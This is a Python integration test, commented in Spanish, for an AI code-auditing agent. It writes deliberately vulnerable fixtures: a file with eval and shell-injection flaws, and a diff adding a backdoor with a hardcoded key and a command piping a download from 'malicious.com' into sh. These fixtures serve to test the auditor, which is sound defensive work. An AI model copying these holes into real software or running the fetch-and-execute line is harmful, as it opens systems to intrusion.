import asyncio
import os
import sys

# Ensure Anti root is in path
sys.path.append(os.getcwd())

from src.agent import AntiAgent

async def setup_mock_targets():
    """Crea los objetivos vulnerables de prueba en el workspace."""
    workspace_dir = "workspace"
    os.makedirs(workspace_dir, exist_ok=True)
    
    # 1. Archivo Python vulnerable
    vuln_code = """
import os
import subprocess

def process_data(user_input):
    # CRITICAL: Inyección de comandos via eval
    data = eval(user_input)
    
    # CRITICAL: Inyección via subprocess con shell=True
    subprocess.run(f"echo {user_input}", shell=True)
    
    # CRITICAL: Secreto hardcodeado
    slack_webhook = "https://hooks.example.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
    
    try:
        os.system(f"cat {user_input}")
    except Exception:
        # WARNING: except vacío que silencia el error
        pass
    
    return data
"""
    vuln_filepath = os.path.join(workspace_dir, "target_audited.py")
    with open(vuln_filepath, "w", encoding="utf-8") as f:
        f.write(vuln_code.strip())
    print(f"[+] Creado objetivo vulnerable de prueba en: {vuln_filepath}")

    # 2. Diff vulnerable
    diff_content = """
diff --git a/src/auth.py b/src/auth.py
index a1b2c3d..e5f6g7h 100644
--- a/src/auth.py
+++ b/src/auth.py
@@ -10,3 +10,12 @@ def login(username, password):
+def backdoor_auth():
+    # CRITICAL: Hardcoded master key
+    master_key = "super_duper_secret_key_12345!!!"
+    
+    # CRITICAL: Inyección remota via exec
+    exec("import os; os.system('curl http://malicious.com/payload | sh')")
+    
+    return True
"""
    diff_filepath = os.path.join(workspace_dir, "target_audited.diff")
    with open(diff_filepath, "w", encoding="utf-8") as f:
        f.write(diff_content.strip())
    print(f"[+] Creado diff vulnerable de prueba en: {diff_filepath}")

async def run_integration_tests():
    await setup_mock_targets()
    
    print("\n=======================================================")
    print(" INICIANDO PRUEBA DE AGENCIA DE PLUGINS CON LM STUDIO ")
    print("=======================================================\n")
    
    agent = AntiAgent()
    
    prompts = [
        {
            "name": "Prueba 1: Auditoría AST Dinámica",
            "prompt": "Audita el archivo de código 'target_audited.py' utilizando tu herramienta de auditoría de AST. Mostrame el reporte detallado que obtengas, explicá las fallas y proponé el código corregido.",
        },
        {
            "name": "Prueba 2: Auditoría de Diffs/PRs Dinámica",
            "prompt": "Audita los cambios descritos en 'target_audited.diff' usando tu herramienta de diffs. Decime qué problemas encontrás en los cambios agregados y si es seguro mergear esto a producción.",
        }
    ]
    
    for i, test in enumerate(prompts):
        print(f"\n🚀 [TEST {i+1}/2] {test['name']}")
        print(f"Instrucción enviada a Anti:\n> \"{test['prompt']}\"\n")
        
        try:
            # handle_command ejecuta el bucle ReAct del agente
            result = await agent.handle_command(test['prompt'])
            response = result['response'] if isinstance(result, dict) else result
            
            print("\n================== RESPUESTA DE ANTI ==================")
            print(response)
            print("=======================================================\n")
        except Exception as e:
            print(f"[ERROR EXTREMO] Ocurrió un fallo ejecutando el test {test['name']}: {e}")

if __name__ == "__main__":
    asyncio.run(run_integration_tests())
